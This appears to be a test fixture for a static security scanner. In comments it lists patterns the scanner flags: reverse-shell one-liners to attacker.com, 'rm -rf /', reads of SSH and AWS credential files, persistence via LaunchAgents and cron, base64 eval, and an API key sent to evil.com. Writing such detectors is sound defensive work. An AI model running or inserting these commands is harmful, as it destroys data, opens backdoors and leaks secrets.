# OpenClaw Shield Test Fixture — Suspicious Strings
#
# THIS FILE CONTAINS SUSPICIOUS PATTERNS FOR TESTING ONLY.
# All patterns are in COMMENTS or QUOTED STRINGS — not executable.
# DO NOT treat this file as containing real secrets or malicious code.
#
# Purpose: Test that the static scanner detects these patterns.

# === ENVIRONMENT VARIABLE PATTERNS ===
# Pattern: env_secret_read
# Example code that reads API keys:
# os.environ.get('OPENAI_API_KEY')
# os.environ['AWS_SECRET_ACCESS_KEY']
# process.env.ANTHROPIC_API_KEY

# === SENSITIVE PATH PATTERNS ===
# Pattern: sensitive_path_access
# Example paths that should trigger:
# ~/.ssh/id_rsa
# ~/.aws/credentials
# ~/Library/Keychains/login.keychain

# === DESTRUCTIVE COMMAND PATTERNS ===
# Pattern: destructive_rm_rf
# Example dangerous commands:
# rm -rf ~/
# rm -rf /
# rm -rf /etc/passwd

# Pattern: destructive_fs_ops
# Example code:
# shutil.rmtree('/important/directory')
# os.remove('/critical/file.txt')

# === PERSISTENCE PATTERNS ===
# Pattern: persistence_launch_agents
# Example paths/commands:
# ~/Library/LaunchAgents/com.malware.plist
# launchctl load ~/Library/LaunchAgents/evil.plist

# Pattern: persistence_cron
# Example:
# crontab -e
# /etc/cron.d/backdoor

# Pattern: shell_profile_mod
# Example paths:
# ~/.bashrc
# ~/.zshrc
# ~/.bash_profile

# === NETWORK BACKDOOR PATTERNS ===
# Pattern: reverse_shell
# Example commands (DO NOT RUN):
# nc -e /bin/bash attacker.com 4444
# bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
# powershell -enc BASE64PAYLOAD

# Pattern: listening_socket
# Example code:
# socket.bind(('0.0.0.0', 4444))
# server.listen(5)
# net.createServer()

# === OBFUSCATION PATTERNS ===
# Pattern: obfuscation_eval_base64
# Example code combining base64 + eval:
# eval(base64.b64decode('payload'))
# exec(atob('encoded_command'))

# === EXFILTRATION COMBO ===
# A file with BOTH secret access AND network calls is flagged as
# possible_exfiltration_combo (critical severity).
#
# Example scenario:
# 1. Reads: os.environ['OPENAI_API_KEY']
# 2. Sends: requests.post('https://evil.com/steal', data=key)

# === END OF TEST PATTERNS ===
